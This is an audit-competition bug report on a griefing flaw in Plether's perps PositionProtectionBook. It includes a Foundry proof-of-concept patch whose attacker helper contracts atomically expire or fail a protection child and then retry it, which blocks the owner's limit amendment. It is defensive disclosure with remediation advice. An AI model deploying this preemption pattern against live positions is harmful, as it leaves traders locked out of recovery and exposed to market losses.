# \#97598 [SC-High] Permissionless terminalize-plus-retry consumes the protection owner's amendment state

**Submitted on Nov 2nd 2026 at 14:09:29 UTC by @rtw0x1 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97598
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

Permissionless retry in `PositionProtectionBook` lets an unrelated caller consume the owner's only retained-limit amendment state. When the caller wins ordering at a failed or expired protection child, the position returns to `Triggered` with the unchanged restrictive ceiling, owner amendment and ordinary close reject, and the open position remains exposed. The reproduced effect maps to the competition's Medium `Griefing` impact.

## Brief/Intro

At commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, a failed or expired protected-close child sets its parent protection to `Latched`. Only the protection owner can amend retained financial limits in that state, but any address can call `retryPositionProtectionClose`. An unrelated caller can therefore terminalize the child and retry atomically, replacing the brief owner-amendment state with a fresh child that carries the same stale limits.

## Vulnerability Details

- Affected asset: `https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src`
- Frozen/current version: commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- Affected components: `PositionProtectionBook` and the Router protection/order lifecycle
- Attacker prerequisite: public protection and child state plus gas; the expiry path needs no position, privileged role, victim signature, or oracle authority

The expected recovery sequence is:

1. A protected close fails or expires.
2. The child is unlinked and the parent protection becomes `Latched`.
3. The owner calls `amendLatchedPositionProtectionCloseLimits`.
4. A retry installs a child using the amended limits.

The implementation does not bind step 3 to the terminal transition. `retryPositionProtectionClose` is permissionless and accepts the `Latched` state. A helper can call `expireOrder` or `executeOrder` and then `retryPositionProtectionClose` in the same transaction. The terminal call writes `Latched`; the retry immediately consumes it, installs a fresh child with the previous limits, and writes `Triggered`.

After attacker-first ordering:

- `amendLatchedPositionProtectionCloseLimits` rejects because the protection is already `Triggered`;
- `cancelPositionProtection` rejects because the protection is not `Armed`;
- an ordinary close rejects because an active protection remains installed; and
- the original position remains open and subject to market movement and liquidation.

The PoC begins with a finite ceiling that is valid at protection creation. A supported price movement makes that ceiling restrictive. It then proves two consecutive constraint-failure cycles and an expiry cycle. The real `SimpleAccount` comparator proves the ordering boundary: owner-first expire/amend/retry closes the position, while attacker-first expire/retry makes the same owner recovery batch revert and leaves the stale child linked.

## Attack Scenario

- Attacker starting position: An unrelated permissionless address with gas and access to public protection, child, and deadline state.
- How starting access is obtained: Protection identifiers, linked child identifiers, status, and deadlines are public contract state; the expiry branch requires no private artifact or special role.
- As an attacker, I can: Atomically terminalize an eligible child and retry its parent before the owner uses the transient `Latched` amendment state.
- Why this vulnerability is required: The same unrelated caller cannot amend retained limits. Without attacker-first retry, the owner-first `SimpleAccount` batch amends the ceiling, installs the replacement child, and completes the protected close.
- Ordered flow: The trader creates a finite-ceiling protection; supported price movement or deadline expiry makes the child terminal; the attacker submits terminalize-plus-retry; the owner submits amend-plus-retry; the attacker transaction lands first; the owner batch rejects; the fresh child retains the restrictive ceiling.
- Victim/system response: The owner attempts the documented amendment and ordinary close paths or competes with an atomic owner batch at the next terminal boundary.
- Residual security impact: Every attacker-winning terminal boundary denies the owner-only amendment and ordinary protected close for that cycle while the open position remains exposed.
- Evidence: `testFork_OwnerSimpleAccountBatchWinsExpireAmendRetryOrdering` succeeds, while `testFork_AttackerAtomicRetryWinsBeforeOwnerSimpleAccountBatch` makes the same real-wallet recovery shape revert and verifies the stale child and open position.

## Impact Details

The reproduced effect is repeatable ordering-dependent griefing. An attacker-winning cycle denies the owner's retained-limit amendment, protection cancellation, and ordinary close while a position remains open. Continued denial requires another attacker win at a later terminal boundary. Free-margin withdrawal remains available, so the demonstrated effect is the protected trading/recovery denial and continued market exposure rather than a complete balance freeze.

## Duplicate Distinction

`MED-9` has material fix-lineage overlap: it led to retained ceilings and owner-only amendment. This finding is the residual ordering defect in that remedy—an unrelated caller consumes the newly added owner-only recovery state without gaining amendment authority.

The October 15 Low has material consequence overlap but a different prerequisite. That issue depends on keeper incentives after the one-time bounty is paid. This path needs no keeper apathy: the adversary actively uses permissionless retry against a recovery action introduced later. Broad Router, keeper, and retry wording still creates material duplicate risk.

## Remediation

Protect the terminal ordering boundary instead of adding only an owner convenience batch. Suitable designs include:

- version retained limits and require retry to bind an owner-approved version;
- define owner limit updates while `Triggered` and bind them to the next child; or
- restrict non-owner retry after persistent financial-constraint failure until the owner updates or explicitly preserves the limits.

An atomic owner amend-while-`Latched` plus retry helper is insufficient by itself because attacker-first terminalize-plus-retry consumes `Latched` before that helper executes. Preserve permissionless liveness for benign keepers without letting unrelated callers erase the only state in which the owner can repair a persistent failure.

## References

- `packages/perps/src/PositionProtectionBook.sol`
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol`
- Repository commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`

## Proof of Concept

## Prerequisites

- Git
- Foundry `forge` 1.5.1
- Network access to the public read-only Arbitrum Sepolia historical endpoint used by the two `SimpleAccount` ordering tests

## Steps To Reproduce

1. Clone and pin the exact competition source.

   ```bash
   git clone https://github.com/immunefi-team/audit-comp-plether.git plether-p009
   cd plether-p009
   git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
   ```

2. Save the following diff as `PocPermissionlessProtectionRetryPreemption.patch`, then apply it.

   ```diff
diff --git a/packages/perps/test/perps/fork/NativeCloseFallback.t.sol b/packages/perps/test/perps/fork/NativeCloseFallback.t.sol
index a1ed7af8..8cbf47f4 100644
--- a/packages/perps/test/perps/fork/NativeCloseFallback.t.sol
+++ b/packages/perps/test/perps/fork/NativeCloseFallback.t.sol
@@ -7,6 +7,9 @@ import {SourceBoundBountyFixture} from "../shared/SourceBoundBountyFixture.sol";
 import {CfdTypes} from "@plether/perps/CfdTypes.sol";
 import {OrderRouter} from "@plether/perps/OrderRouter.sol";
 import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
+import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
+import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
+import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
 
 interface INativeSimpleFactory {
 
@@ -19,12 +22,35 @@ interface INativeSimpleFactory {
 
 interface INativeSimpleAccount {
 
+    struct Call {
+        address target;
+        uint256 value;
+        bytes data;
+    }
+
     function owner() external view returns (address);
     function execute(
         address dest,
         uint256 value,
         bytes calldata data
     ) external;
+    function executeBatch(
+        Call[] calldata calls
+    ) external;
+
+}
+
+contract NativeProtectionRetryPreemptor {
+
+    function expireAndRetry(
+        OrderRouter router,
+        IPositionProtectionActions protectionActions,
+        uint64 orderId,
+        uint64 protectionId
+    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
+        result = router.expireOrder(orderId);
+        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
+    }
 
 }
 
@@ -36,6 +62,7 @@ contract NativeCloseFallbackTest is SourceBoundBountyFixture {
     address constant IMPLEMENTATION = 0x28426d752372D68d34340bd94390950DcE3C9ec3;
     address constant OWNER = address(0xA11CE);
     uint256 constant SOURCE_RPC_BLOCK = 319_094_449;
+    uint256 constant PROTECTION_TRIGGER_PRICE = 90_000_000;
     INativeSimpleAccount private account;
 
     function setUp() public override {
@@ -127,4 +154,158 @@ contract NativeCloseFallbackTest is SourceBoundBountyFixture {
         _bountyExecute(id, BOUNTY_PRICE, OWNER, OrderV3Types.LifecycleStatus.Executed);
     }
 
+    function testFork_OwnerSimpleAccountBatchWinsExpireAmendRetryOrdering() public {
+        (IPositionProtectionActions actions, IPositionProtectionViews views, uint64 protectionId, uint64 orderId) =
+            _createAndTriggerFiniteProtection();
+        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _amendedProtectionLimits();
+        _warpPastOrderDeadline(orderId);
+
+        INativeSimpleAccount.Call[] memory calls = new INativeSimpleAccount.Call[](3);
+        calls[0] = INativeSimpleAccount.Call(
+            address(router), 0, abi.encodeCall(OrderRouter.expireOrder, (orderId))
+        );
+        calls[1] = INativeSimpleAccount.Call(
+            address(actions),
+            0,
+            abi.encodeCall(IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits, (protectionId, amendedLimits))
+        );
+        calls[2] = INativeSimpleAccount.Call(
+            address(actions), 0, abi.encodeCall(IPositionProtectionActions.retryPositionProtectionClose, (protectionId))
+        );
+
+        vm.prank(OWNER);
+        account.executeBatch(calls);
+
+        PositionProtectionTypes.PositionProtectionView memory recovered = views.getPositionProtection(protectionId);
+        assertEq(uint8(recovered.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+        assertGt(recovered.linkedOrderId, orderId, "owner batch installs the amended retry");
+        assertEq(
+            router.lifecycleBook().pendingPolicy(recovered.linkedOrderId).maxExecutionNotionalAssets,
+            amendedLimits.maxExecutionNotionalAssets,
+            "owner batch binds the amended finite ceiling"
+        );
+
+        bytes[] memory executionData = _mockPythUpdateData(PROTECTION_TRIGGER_PRICE);
+        vm.prank(BOUNTY_OTHER);
+        OrderV3Types.ExecutionResult memory result = router.executeOrder(recovered.linkedOrderId, executionData);
+        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
+        (uint256 remainingSize,,,,,,) = engine.positions(address(account));
+        assertEq(remainingSize, 0, "owner-first supported batch recovers the protected account");
+    }
+
+    function testFork_AttackerAtomicRetryWinsBeforeOwnerSimpleAccountBatch() public {
+        (IPositionProtectionActions actions, IPositionProtectionViews views, uint64 protectionId, uint64 orderId) =
+            _createAndTriggerFiniteProtection();
+        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = _amendedProtectionLimits();
+        _warpPastOrderDeadline(orderId);
+
+        NativeProtectionRetryPreemptor preemptor = new NativeProtectionRetryPreemptor();
+        (OrderV3Types.ExecutionResult memory expiryResult, uint64 attackerRetryId) =
+            preemptor.expireAndRetry(router, actions, orderId, protectionId);
+        assertEq(uint8(expiryResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
+        assertEq(uint8(expiryResult.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
+
+        INativeSimpleAccount.Call[] memory ownerRecovery = new INativeSimpleAccount.Call[](2);
+        ownerRecovery[0] = INativeSimpleAccount.Call(
+            address(actions),
+            0,
+            abi.encodeCall(IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits, (protectionId, amendedLimits))
+        );
+        ownerRecovery[1] = INativeSimpleAccount.Call(
+            address(actions), 0, abi.encodeCall(IPositionProtectionActions.retryPositionProtectionClose, (protectionId))
+        );
+
+        vm.prank(OWNER);
+        vm.expectRevert();
+        account.executeBatch(ownerRecovery);
+
+        PositionProtectionTypes.PositionProtectionView memory preempted = views.getPositionProtection(protectionId);
+        assertEq(uint8(preempted.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+        assertEq(preempted.linkedOrderId, attackerRetryId, "attacker-first ordering consumes Latched");
+        assertEq(
+            router.lifecycleBook().pendingPolicy(attackerRetryId).maxExecutionNotionalAssets,
+            _initialProtectionLimit(),
+            "attacker retry preserves the trader's now-stale finite ceiling"
+        );
+        (uint256 remainingSize,,,,,,) = engine.positions(address(account));
+        assertEq(remainingSize, BOUNTY_SIZE, "attacker-first ordering leaves the account exposed");
+    }
+
+    function _createAndTriggerFiniteProtection()
+        private
+        returns (
+            IPositionProtectionActions actions,
+            IPositionProtectionViews views,
+            uint64 protectionId,
+            uint64 orderId
+        )
+    {
+        actions = IPositionProtectionActions(address(router.positionProtectionBook()));
+        views = IPositionProtectionViews(address(router.positionProtectionBook()));
+        _fundProtectionBountyThroughOwner();
+        router.updateMarkPrice(_mockPythUpdateData(BOUNTY_PRICE));
+        PositionProtectionTypes.PositionProtectionParams memory params;
+        params.takeProfitTriggerPrice = PROTECTION_TRIGGER_PRICE;
+        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: _initialProtectionLimit(),
+            maxGrossAccountDebitAssets: type(uint256).max,
+            maxActionChargeAssets: type(uint256).max,
+            maxExplicitFeesAssets: type(uint256).max
+        });
+        vm.prank(OWNER);
+        account.execute(address(actions), 0, abi.encodeCall(IPositionProtectionActions.createPositionProtection, (params)));
+        protectionId = views.activePositionProtectionId(address(account));
+        assertGt(protectionId, 0, "real SimpleAccount owns the protection");
+
+        bytes[] memory triggerData = _mockPythUpdateData(PROTECTION_TRIGGER_PRICE);
+        vm.prank(BOUNTY_OTHER);
+        orderId = actions.triggerPositionProtection(protectionId, triggerData);
+        assertEq(views.getPositionProtection(protectionId).linkedOrderId, orderId);
+    }
+
+    function _fundProtectionBountyThroughOwner() private {
+        uint256 amount = 1e6;
+        settlementToken.mint(address(account), amount);
+        vm.prank(OWNER);
+        account.execute(
+            address(settlementToken),
+            0,
+            abi.encodeWithSignature("approve(address,uint256)", address(clearinghouse), amount)
+        );
+        vm.prank(OWNER);
+        account.execute(
+            address(clearinghouse),
+            0,
+            abi.encodeWithSignature("deposit(address,uint256)", address(account), amount)
+        );
+        assertEq(
+            clearinghouse.getFreeBuyingPowerAssets(address(account)),
+            amount,
+            "owner funds only the protection-bounty acquisition prerequisite"
+        );
+    }
+
+    function _warpPastOrderDeadline(
+        uint64 orderId
+    ) private {
+        vm.warp(uint256(router.lifecycleBook().orderTiming(orderId).executionDeadline) + 1);
+    }
+
+    function _initialProtectionLimit() private pure returns (uint256) {
+        return (BOUNTY_SIZE * PROTECTION_TRIGGER_PRICE) / 1e20;
+    }
+
+    function _amendedProtectionLimits()
+        private
+        pure
+        returns (PositionProtectionTypes.CloseFinancialLimits memory limits)
+    {
+        limits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: 25_000e6,
+            maxGrossAccountDebitAssets: 25_000e6,
+            maxActionChargeAssets: 25_000e6,
+            maxExplicitFeesAssets: 25_000e6
+        });
+    }
+
 }
diff --git a/packages/perps/test/perps/spec/trader/PositionProtection.t.sol b/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
index f16fde7a..2ab7e617 100644
--- a/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
+++ b/packages/perps/test/perps/spec/trader/PositionProtection.t.sol
@@ -14,6 +14,7 @@ import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook
 import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
 import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
 import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
+import {IPerpsKeeper} from "@plether/perps/interfaces/IPerpsKeeper.sol";
 import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
 import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
 import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
@@ -24,6 +25,33 @@ import {MockPyth} from "@plether/test-utils/MockPyth.sol";
 import {StdStorage, stdStorage} from "forge-std/StdStorage.sol";
 import {Vm} from "forge-std/Vm.sol";
 
+contract PermissionlessProtectionRetryPreemptor {
+
+    function failAndRetry(
+        IPerpsKeeper keeper,
+        IPositionProtectionActions protectionActions,
+        uint64 orderId,
+        uint64 protectionId,
+        bytes[] calldata pythUpdateData
+    ) external payable returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
+        result = keeper.executeOrder{value: msg.value}(orderId, pythUpdateData);
+        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
+    }
+
+    function expireAndRetry(
+        IPerpsKeeper keeper,
+        IPositionProtectionActions protectionActions,
+        uint64 orderId,
+        uint64 protectionId
+    ) external returns (OrderV3Types.ExecutionResult memory result, uint64 retryOrderId) {
+        result = keeper.expireOrder(orderId);
+        retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
+    }
+
+    receive() external payable {}
+
+}
+
 contract PositionProtectionTest is BasePerpTest {
 
     using stdStorage for StdStorage;
@@ -1004,6 +1032,114 @@ contract PositionProtectionTest is BasePerpTest {
         assertEq(remainingSize, 0, "amended retry must close the protected position");
     }
 
+    function test_PermissionlessRetryCanAtomicallyPreemptOwnerAmendment() public {
+        _startRecordingLogs();
+        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
+        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
+        uint256 initiallyAcceptableNotionalAssets = (POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20;
+        uint256 restrictiveExecutionPrice = LONG_TAKE_PROFIT + 1_000_000;
+        params.closeLimits.maxExecutionNotionalAssets = initiallyAcceptableNotionalAssets;
+
+        vm.prank(ALICE);
+        uint64 protectionId = protectionActions.createPositionProtection(params);
+        uint64 firstOrderId = _triggerAt(protectionId, LONG_TAKE_PROFIT);
+        PermissionlessProtectionRetryPreemptor preemptor = new PermissionlessProtectionRetryPreemptor();
+
+        bytes[] memory firstExecutionData = _mockPythUpdateData(restrictiveExecutionPrice);
+        (OrderV3Types.ExecutionResult memory firstResult, uint64 firstRetryOrderId) = preemptor.failAndRetry(
+            IPerpsKeeper(address(router)), protectionActions, firstOrderId, protectionId, firstExecutionData
+        );
+
+        assertEq(uint8(firstResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
+        assertEq(uint8(firstResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
+        assertEq(
+            uint8(_verifiedOutcome(IOrderLifecycleBook(address(router.lifecycleBook())), firstOrderId).failedConstraint),
+            uint8(OrderV3Types.ConstraintKind.ExecutionNotional),
+            "a supported post-trigger market move must make the originally acceptable finite ceiling restrictive"
+        );
+        assertGt(firstRetryOrderId, firstOrderId, "atomic retry must install a fresh child");
+        _assertPendingCloseLimits(firstRetryOrderId, params.closeLimits);
+        PositionProtectionTypes.PositionProtectionView memory firstRetried =
+            protectionViews.getPositionProtection(protectionId);
+        assertEq(uint8(firstRetried.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+        assertEq(firstRetried.linkedOrderId, firstRetryOrderId);
+        assertEq(router.pendingOrderCounts(ALICE), 1, "one failing child remains live");
+
+        PositionProtectionTypes.CloseFinancialLimits memory amendedLimits = PositionProtectionTypes.CloseFinancialLimits({
+            maxExecutionNotionalAssets: 25_000e6,
+            maxGrossAccountDebitAssets: 25_000e6,
+            maxActionChargeAssets: 25_000e6,
+            maxExplicitFeesAssets: 25_000e6
+        });
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
+        protectionActions.cancelPositionProtection(protectionId);
+
+        uint256 walletAssetsBefore = settlementToken.balanceOf(ALICE);
+        vm.prank(ALICE);
+        clearinghouse.withdrawMargin(1e6);
+        assertEq(
+            settlementToken.balanceOf(ALICE),
+            walletAssetsBefore + 1e6,
+            "active protection blocks orders but does not freeze withdrawable free margin"
+        );
+
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
+        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
+        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
+        assertEq(remainingSize, POSITION_SIZE, "failed close and atomic retry keep the position exposed");
+
+        bytes[] memory secondExecutionData = _mockPythUpdateData(restrictiveExecutionPrice);
+        (OrderV3Types.ExecutionResult memory secondConstraintResult, uint64 secondConstraintRetryOrderId) =
+            preemptor.failAndRetry(
+                IPerpsKeeper(address(router)),
+                protectionActions,
+                firstRetryOrderId,
+                protectionId,
+                secondExecutionData
+            );
+
+        assertEq(uint8(secondConstraintResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
+        assertEq(
+            uint8(secondConstraintResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation)
+        );
+        assertGt(
+            secondConstraintRetryOrderId,
+            firstRetryOrderId,
+            "fresh oracle basket lets the attacker repeat the constraint-failure loop"
+        );
+        _assertPendingCloseLimits(secondConstraintRetryOrderId, params.closeLimits);
+        assertEq(
+            protectionViews.getPositionProtection(protectionId).linkedOrderId,
+            secondConstraintRetryOrderId,
+            "the unchanged failing limits remain installed after a second oracle-backed cycle"
+        );
+        vm.prank(ALICE);
+        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
+        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, amendedLimits);
+
+        vm.warp(uint256(router.lifecycleBook().orderTiming(secondConstraintRetryOrderId).executionDeadline) + 1);
+        (OrderV3Types.ExecutionResult memory expiryResult, uint64 expiryRetryOrderId) = preemptor.expireAndRetry(
+            IPerpsKeeper(address(router)), protectionActions, secondConstraintRetryOrderId, protectionId
+        );
+
+        assertEq(uint8(expiryResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
+        assertEq(uint8(expiryResult.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
+        assertGt(expiryRetryOrderId, secondConstraintRetryOrderId, "expiry preemption loop must remain repeatable");
+        _assertPendingCloseLimits(expiryRetryOrderId, params.closeLimits);
+        PositionProtectionTypes.PositionProtectionView memory expiryRetried =
+            protectionViews.getPositionProtection(protectionId);
+        assertEq(uint8(expiryRetried.status), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
+        assertEq(expiryRetried.linkedOrderId, expiryRetryOrderId);
+        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "trade lock remains active");
+        assertEq(router.pendingOrderCounts(ALICE), 1, "the attacker can maintain one live failing child");
+    }
+
     function test_RetryPositionProtectionClose_StaleOldAttemptCallbacksCannotMutateReplacement() public {
         _startRecordingLogs();
         uint64 protectionId = _createSingleLegProtection(CfdTypes.Side.LONG, LONG_TAKE_PROFIT, 0);
   ```

   ```bash
   git apply --check PocPermissionlessProtectionRetryPreemption.patch
   git apply PocPermissionlessProtectionRetryPreemption.patch
   ```

3. Run the local preemption case and owner-control case.

   ```bash
   forge test --root packages/perps --match-test 'test_PermissionlessRetryCanAtomicallyPreemptOwnerAmendment|test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry' -vv
   ```

   Expected result: both tests pass. The raw terminal capture `step-03-local-preemption-and-control-pass.png` records this exact command and result.

4. Run all four focused cases, including both real `SimpleAccount` orderings on the pinned historical fork.

   ```bash
   NATIVE_CLOSE_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --root packages/perps --match-test 'test_PermissionlessRetryCanAtomicallyPreemptOwnerAmendment|test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry|testFork_OwnerSimpleAccountBatchWinsExpireAmendRetryOrdering|testFork_AttackerAtomicRetryWinsBeforeOwnerSimpleAccountBatch' -vv
   ```

   Expected result:

   ```text
   [PASS] test_PermissionlessRetryCanAtomicallyPreemptOwnerAmendment()
   [PASS] test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry()
   [PASS] testFork_AttackerAtomicRetryWinsBeforeOwnerSimpleAccountBatch()
   [PASS] testFork_OwnerSimpleAccountBatchWinsExpireAmendRetryOrdering()
   Suite result: ok. 4 passed; 0 failed; 0 skipped
   ```

5. Verify the security delta in the assertions:

   - the restrictive finite ceiling remains installed after attacker retry;
   - amendment, cancellation, and ordinary close reject after attacker-first retry;
   - two constraint-failure cycles and one expiry cycle install fresh stale-limit children;
   - free-margin withdrawal succeeds as a boundary control;
   - owner-first real-wallet ordering closes the position; and
   - attacker-first real-wallet ordering makes owner recovery reject and leaves the position open.

6. Cleanup: discard the local clone after verification. The fork uses historical state and does not broadcast a transaction.

## Proof of Impact

| Run | Security-relevant input/state | Observed result |
|---|---|---|
| Owner control | Real `SimpleAccount` executes expire, amend, and retry first | Amended finite ceiling is bound to the fresh child and the protected position closes |
| Attacker ordering | Unrelated helper executes expire and retry before the owner's batch | Parent returns to `Triggered` with the stale child; owner recovery rejects; position remains open |
| Repeated constraint cycle | Supported price movement makes an originally valid finite ceiling restrictive | Two attacker cycles each create a fresh child with unchanged limits and keep owner amendment unavailable |
| Withdrawal boundary | Owner withdraws one unit of free margin during active protection | Withdrawal succeeds, bounding the effect to recovery and protected trading rather than all wallet assets |

The exact-commit run passed all four cases with Foundry 1.5.1 and solc 0.8.35 at Arbitrum Sepolia fork block `319094449`.

# Secret Gist (optional)

The complete reducer is inline above; no Gist is required.

# Attachments

- `step-03-local-preemption-and-control-pass.png` — raw terminal capture of the exact local preemption/control command and passing result
